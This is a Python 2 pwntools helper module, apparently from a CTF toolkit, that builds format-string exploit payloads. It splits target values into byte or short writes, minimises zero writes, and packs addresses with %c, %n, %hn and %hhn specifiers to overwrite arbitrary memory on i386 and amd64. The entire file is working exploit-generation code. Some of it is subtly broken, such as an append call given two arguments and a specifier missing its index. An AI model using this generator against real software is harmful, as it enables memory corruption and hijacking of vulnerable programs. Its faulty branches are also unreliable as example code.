import collections
from pwn import *
from mypwn.mypwnlib.Exception.myExcept import *

# get the value to write, return by list
def split_value(value,len,write_size):
    value_pack=p64(value)
    ret_value_list=[]
    try:
        if write_size=='byte':
            for i in range(len):
                ret_value_list.append(u8(value_pack[i]))

        elif write_size=='short':
            split_time=len/2
            if len%2!=0:
                split_time+=1
            for i in range(split_time):
                ret_value_list.append(u16(value_pack[2*i:2*(i+1)]))
        else:
            raise argError("the argument: write_size must be 'byte' or 'short!'")
    except argError as except1:
        print(except1)
        quit()
    return ret_value_list
    
# get the addr to write, return by list
def ret_addr_list(addr,len,write_size):
    ret_addr_list=[]
    try:
        if write_size=='byte':
            for i in range(len):
                ret_addr_list.append(addr+i)
        elif write_size=='short':
            addr_num=len/2
            if len%2!=0:
                addr_num+=1
            for i in range(addr_num):
                ret_addr_list.append(addr+i*2)
        else:
            raise argError("the argument: write_size must be 'byte' or 'short!'")
    except argError as except1:
        print(except1)
        quit()
    return ret_addr_list

# reduce the len of writes
def shorten_writes(addr_list,value_list,write_size):

    zero_zone=[]
    zero_left_is_append=0
    ret_tuple_addr_list=[]
    to_change=len(value_list)
    max_right=len(value_list)-1
    for i in range(to_change):
        if zero_left_is_append==0:
            if value_list[i]==0:
                zero_zone.append(i)
                zero_left_is_append=1
        else:
            if value_list[i]!=0:
                zero_zone.append(i)
                zero_left_is_append=0

    if value_list[max_right]==0:
        zero_zone.append(to_change)

    if len(zero_zone)!=0:
        for i in range(len(zero_zone)/2):
            zero_zone_left=zero_zone[2*i]
            zero_len=zero_zone[2*i+1]-zero_zone[2*i]
            if zero_len>4 and write_size=='short':
                try:
                    raise argError('Error: argument write_size must be byte not short!\n')
                except argError as except1:
                    print('\n====================================================')
                    print(except1)
                    quit() 
            if zero_len==8 or zero_len==7 or zero_len==6 or zero_len ==5:
                ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$n'))
                ret_tuple_addr_list.append((addr_list[zero_zone_left+zero_len-4],'%{}$n'))
            elif zero_len==4:
                if write_size=='byte':                  
                    ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$n'))
                elif write_size=='short':
                    ret_tuple_addr_list.append((addr_list[0],'%{}$n'))
                    ret_tuple_addr_list.append((addr_list[2],'%{}$n'))

            elif zero_len==3:
                if write_size=='byte':
                    if max_right-zero_zone_left>2:          # 
                        ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$n'))
                    else:
                        ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$hn'))
                        ret_tuple_addr_list.append((addr_list[zero_zone_left+1],'%{}$hn'))
                elif write_size=='short':
                    ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$n'))
                    if max_right-zero_zone_left>0:
                        ret_tuple_addr_list.append((addr_list[zero_zone_left+2],'%{}$n'))
                    else:
                        ret_tuple_addr_list.append((addr_list[zero_zone_left+2],'%{}$hn'))

            elif zero_len==2:         
                if write_size=='byte':
                    if max_right-zero_zone_left>2:
                        ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$n'))
                    else:
                        ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$hn'))

                elif write_size=='short':
                    ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$n'))

            elif zero_len==1:      
                if write_size=='byte':
                    if max_right-zero_zone_left>2:
                        ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$n'))
                    elif max_right-zero_zone_left>0:
                        ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$hn'))
                    else:
                        ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$hhn'))
                elif write_size=='short':
                    if max_right-zero_zone_left>0:
                        ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$n'))
                    else:
                        ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$hn'))
    return ret_tuple_addr_list

# try the best situation to shorten the len of writes
def shorten_writes_best(addr_list,value_list,write_size):

    zero_zone=[]
    zero_left_is_append=0
    ret_tuple_addr_list=[]
    to_change=len(value_list)

    for i in range(to_change):
        if zero_left_is_append==0:
            if value_list[i]==0:
                zero_zone.append(i)
                zero_left_is_append=1
        else:
            if value_list[i]!=0:
                zero_zone.append(i)
                zero_left_is_append=0

    if value_list[to_change-1]==0:
        zero_zone.append(to_change)


    if len(zero_zone)!=0:
        for i in range(len(zero_zone)/2):
            
            zero_zone_left=zero_zone[2*i]
            zero_len=zero_zone[2*i+1]-zero_zone[2*i]

            if zero_len>4 and write_size=='short':
                try:
                    raise argError('Error: argument write_size must be byte not short!\n')
                except argError as except1:
                    print('\n====================================================')
                    print(except1)
                    quit() 
            if zero_len==8:
                ret_tuple_addr_list.append((addr_list[0],'%{}$n'))     # 4
                ret_tuple_addr_list.append((addr_list[4],'%{}$n'))     # 4

            elif zero_len==7: # done
                if zero_zone_left==0:
                    ret_tuple_addr_list.append((addr_list[0],'%{}$n')) # 4
                    ret_tuple_addr_list.append((addr_list[3],'%{}$n'))
                else:
                    ret_tuple_addr_list.append((addr_list[0],'%{}$n')) # 4
                    ret_tuple_addr_list.append((addr_list[4],"%{}$n")) # 4

            elif zero_len==6: # done
                if zero_zone_left==0:
                    ret_tuple_addr_list.append((addr_list[0],'%{}$n'))
                    ret_tuple_addr_list.append((addr_list[2],'%{}$n'))
                else:
                    ret_tuple_addr_list.append((addr_list[zero_zone_left-1],'%{}$n'))
                    ret_tuple_addr_list.append((addr_list[zero_zone_left+2],'%{}$n'))

            elif zero_len==5: # done
                if zero_zone_left==0:
                    ret_tuple_addr_list.append((addr_list[0],'%{}$n'))
                    ret_tuple_addr_list.append((addr_list[1],'%{}$n'))
                else:
                    ret_tuple_addr_list.append((addr_list[zero_zone_left-1],'%{}$n'))
                    ret_tuple_addr_list.append((addr_list[zero_zone_left+1],'%{}$n'))

            elif zero_len==4: # done
                if write_size=='byte':                  
                    ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$n'))
                elif write_size=='short':
                    ret_tuple_addr_list.append((addr_list[0],'%{}$n'))
                    ret_tuple_addr_list.append((addr_list[2],'%{}$n'))

            elif zero_len==3: # 
                if zero_zone_left==0:
                    if write_size=='byte':
                        if to_change==3:
                            ret_tuple_addr_list.append((addr_list[0],'%{}$hn'))
                            ret_tuple_addr_list.append((addr_list[2],'%{}$hhn'))
                        else:
                            ret_tuple_addr_list.append((addr_list[0],'%{}$n'))

                    elif write_size=='short':
                        ret_tuple_addr_list.append((addr_list[0],'%{}$n'))
                        if to_change==3:
                            ret_tuple_addr_list.append((addr_list[2],'%{}$hn'))
                        else:
                            ret_tuple_addr_list.append((addr_list[2],'%{}$n'))
                else:
                    if write_size=='byte':
                        ret_tuple_addr_list.append((addr_list[zero_zone_left-1],'%{}$n'))
                    elif write_size=='short':
                        ret_tuple_addr_list.append((addr_list[0],'%{}$n'))
                        ret_tuple_addr_list.append((addr_list[2],'%{}$n'))

            elif zero_len==2:         
                if zero_zone_left==0:
                    if write_size=='byte':
                        if to_change<4:
                            ret_tuple_addr_list.append((addr_list[0],'%{}$hn'))
                        elif to_change>=4:
                            ret_tuple_addr_list.append((addr_list[0],'%{}$n'))

                    elif write_size=='short':
                        ret_tuple_addr_list.append((addr_list[0],'%{}$n'))

                else:
                    if write_size=='byte':
                        if to_change==3:
                            ret_tuple_addr_list.append(addr_list[zero_zone_left],'%{}$hn')
                        else:
                            if value_list[zero_zone_left-1]<value_list[zero_zone_left+2]:
                                ret_tuple_addr_list.append((addr_list[zero_zone_left-1],'%{}$n'))
                            else:
                                ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$hn'))
                    elif write_size=='short':
                        ret_tuple_addr_list.append((addr_list[zero_zone_left],'%{}$n'))

            elif zero_len==1:      
                if zero_zone_left==0:         
                    if to_change==1:
                        if write_size=='byte':
                            ret_tuple_addr_list.append((addr_list[0],'%{}$hhn'))
                        elif write_size=='short':
                            ret_tuple_addr_list.append((addr_list[0],'%{}$hn'))
                    elif 1<to_change<4:
                        if write_size=='byte':
                            ret_tuple_addr_list.append((addr_list[0],'%{}$hn'))
                        elif write_size=='short':
                            ret_tuple_addr_list.append((addr_list[0],'%{}$n'))
                    elif to_change>=4:
                        ret_tuple_addr_list.append((addr_list[0],'%{}$n'))
                else:
                    if write_size=='byte':
                        if to_change-zero_zone_left>3:
                            ret_tuple_addr_list.append((addr_list[zero_zone_left-1],'%{}$n'))
                        else:
                            ret_tuple_addr_list.append((addr_list[zero_zone_left],'%hn'))
                    elif write_size=='short':
                        ret_tuple_addr_list.append((addr_list[zero_zone_left-1],'%{}$n'))
    return ret_tuple_addr_list

# deal with the writes={}, split it into the address:value pair
def ret_dealed_writes(writes,write_size,just_change_low_bit,change_all_bits,try_best):
    write_addr=writes.keys()
    write_value=writes.values()
    new_addr=[]
    new_value=[]
    value_num=[]

    addr_list=[]
    value_list=[]
    shorten_zero=[]
    for i in range(len(write_value)):    
        if just_change_low_bit:
                if write_value[i]>0xffffffffffff:      # change 7 bytes
                    addr_list=ret_addr_list(write_addr[i],7,write_size)
                    value_list=split_value(write_value[i],7,write_size)

                elif write_value[i]>0xffffffffff:      # change 6 bytes
                    addr_list=ret_addr_list(write_addr[i],6,write_size)
                    value_list=split_value(write_value[i],6,write_size)
                elif write_value[i]>0xffffffff:        # change 5 bytes
                    addr_list=ret_addr_list(write_addr[i],5,write_size)
                    value_list=split_value(write_value[i],5,write_size)
                elif write_value[i]>0xffffff:          # change 4 bytes
                    addr_list=ret_addr_list(write_addr[i],4,write_size)
                    value_list=split_value(write_value[i],4,write_size)
                elif write_value[i]>0xffff:            # change 3 bytes
                    addr_list=ret_addr_list(write_addr[i],3,write_size)
                    value_list=split_value(write_value[i],3,write_size)      
                elif write_value[i]>0xff:              # change 2 bytes
                    addr_list=ret_addr_list(write_addr[i],2,write_size)
                    value_list=split_value(write_value[i],2,write_size)
                else:                               # just change 1 bytes
                    addr_list=ret_addr_list(write_addr[i],1,write_size)
                    value_list=split_value(write_value[i],1,write_size)
        else:                                       # change all bytes
            change_bytes=4
            if context.arch=='amd64':
                change_bytes=6
                if change_all_bits:
                    change_bytes=8
            addr_list=ret_addr_list(write_addr[i],change_bytes,write_size)
            value_list=split_value(write_value[i],change_bytes,write_size)
        
        new_addr+=addr_list
        new_value+=value_list

        if try_best:
            shorten_zero+=shorten_writes_best(addr_list,value_list,write_size)
        else:
            shorten_zero+=shorten_writes(addr_list,value_list,write_size)
    return [dict(zip(new_addr,new_value)),shorten_zero]

# sort the writes by value from small to large
def ret_sort_writes(writes):
    not_sort_addr=writes.keys()
    not_sort_value=writes.values()
    sorted_addr=[]
    sorted_value=[]
    for i in range(len(writes)):
        min_index=not_sort_value.index(min(not_sort_value))
        sorted_addr.append(not_sort_addr[min_index])
        sorted_value.append(not_sort_value[min_index])
        del not_sort_addr[min_index]
        del not_sort_value[min_index]
    return collections.OrderedDict(zip(sorted_addr,sorted_value))    

# return the fmtstr offset in memory
def fmt_offset(fmtstr_posi,sp_posi):
    """
    fmt_offset(fmtstr_posi,esp_posi)
        return fmt offset to use in generate fmt_payload
        1. <fmtstr_posi>: give the fmt string posi in memory
        2. <esp_posi>: give the value of register ESP  
    """
    try:
        if context.arch!='i386' and context.arch!='amd64':
            raise contextArchError("context.arch must be amd64 or i386!")
    except contextArchError as except0:
        print(except0)
        quit()
    
    if context.arch=='i386':
        return (fmtstr_posi-sp_posi)/4
    else:
        return (fmtstr_posi-sp_posi)/8+6

def convert_addr_payload(addr_list,value_list):
    ret_string=''
    for i in range(len(addr_list)):
        ret_string+=hex(addr_list[i])+' --> '+hex(value_list[i])+'\n'
    return ret_string.rstrip('\n')

def fmt_payload(offset,writes,write_size='byte',just_ret_print_payload=0,just_change_low_bit=1,change_all_bits=0,try_best=0):

    """
        fmt_payload(offset,writes,write_size='byte',just_ret_print_payload=0,just_change_low_bit=1,change_all_bits=0,try_best=0)
        an function generate fmt vul payload
        it can use in i386 and amd64
        the argument is the same as fmtstr_payload except fot just_change_low_bit.
        #<just_change_low_bit>: used to configure if change an word or double word
            or just bytes that given in writes={}.
            such as in i386:
                if just_change_low_bit==0:
                    writes={0x0:0x1} will change addr: 0x0,0x1,0x2,0x3 
                else:
                    writes={0x0:0x1} will change addr: 0x0
        #<change_all_bits>: just use in amd64, if set, will change 8 bytes not 6 bytes
        #<show_payload>: if set, will print the payload to stdin
    """
    
    try:
        if context.arch!='i386' and context.arch!='amd64':
            raise contextArchError("\nError: context.arch must be amd64 or i386!")
        if just_change_low_bit==1 and change_all_bits ==1:
            raise argError("Error: the argument: just_change_low_bit and change_all_bits can't be 1 at the same time!\n")
    except contextArchError as except0:
        print('\n=====================================')
        print(except0)
        quit()
    except argError as except2:
        print("\n=====================================")
        print(except2)
        quit()
    
    dealed_writes=ret_dealed_writes(writes,write_size,just_change_low_bit,change_all_bits,try_best)
    sorted_writes=ret_sort_writes(dealed_writes[0])
    sorted_writes_addr_list=sorted_writes.keys()
    sorted_writes_value_list=sorted_writes.values()
    zero_dict=dict(dealed_writes[1])

    addr_payload=''
    print_payload=''
    write_print_payload='%{}$hhn'
    if write_size=='short':
        write_print_payload='%{}$hn'

    write_times=0
    for i in range(len(sorted_writes_value_list)):
        keys_in_zero_dict=0
        if zero_dict.has_key(sorted_writes_addr_list[i]):
            keys_in_zero_dict=1
            zero_print_payload=zero_dict.get(sorted_writes_addr_list[i])

        if sorted_writes_value_list[i]==0:
            if keys_in_zero_dict:
                print_payload+=zero_print_payload
            else:
                continue                  
        else:
            if i==0:
                print_payload+='%{}c'.format(sorted_writes_value_list[i])            
            else:
                sub=sorted_writes_value_list[i]-sorted_writes_value_list[i-1]
                if sub!=0:
                    print_payload+='%{}c'.format(sub)
            if keys_in_zero_dict:
                print_payload+=zero_print_payload
            else:
                print_payload+=write_print_payload

        if context.arch=='i386':
            addr_payload+=p32(sorted_writes_addr_list[i])
        elif context.arch=='amd64':
            addr_payload+=p64(sorted_writes_addr_list[i])
        write_times+=1
    
    print_payload_len=len(print_payload)-write_times*2+write_times*(len(str(offset))+1)

    ret_payload1=''
    ret_payload2=''
    addr_in_before=0

    # ret_payload1
    mode_num=4
    if context.arch=='amd64':
        mode_num=8
    index_num=print_payload_len/mode_num
    if print_payload_len%mode_num!=0:
        index_num+=1
        print_payload_len=index_num*mode_num
    first_index=index_num+offset

    print_payload1=print_payload
    for i in range(write_times):
        print_payload1=print_payload1.replace("{}",str(first_index+i),1)
    
    offset_sub=(print_payload_len-len(print_payload1))/mode_num
    if offset_sub>0:
        first_index=first_index-offset_sub
        print_payload_len=print_payload_len-offset_sub*mode_num
        print_payload1=print_payload
        for i in range(write_times):
            print_payload1=print_payload1.replace('{}',str(first_index+i),1)
    if just_ret_print_payload:
        return print_payload1
    print_payload1=print_payload1.ljust(print_payload_len,'\xbb')
    ret_payload1=print_payload1+addr_payload
    
    # ret_payload2 just use in i386

    if '\x00' not in addr_payload:
        addr_in_before=1
        print_payload2=print_payload
        for i in range(write_times):
            print_payload2=print_payload2.replace("{}",str(offset+i),1)

        add_num=256-len(addr_payload)
        if add_num!=0:
            print_payload2='%{}c'.format(add_num)+print_payload2
        ret_payload2=addr_payload+print_payload2

        if addr_in_before:
            if len(ret_payload2)<len(ret_payload1):
                return ret_payload2  
    return ret_payload1
